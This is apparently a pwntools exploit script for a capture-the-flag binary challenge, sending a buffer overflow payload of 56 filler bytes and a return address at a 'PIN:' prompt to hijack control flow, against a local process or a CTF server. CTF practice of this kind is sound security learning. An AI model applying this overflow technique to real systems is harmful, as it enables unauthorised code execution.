#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)

context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x40155D

        c
        ''')
        input()


if args.REMOTE:
    p = remote('challs.nusgreyhats.org', 30211)
else:
    p = process(exe.path)
GDB()

payload = b'a' * 56 + flat(0, 0, 0x401393)
sla(b'PIN: ', payload)

p.interactive()
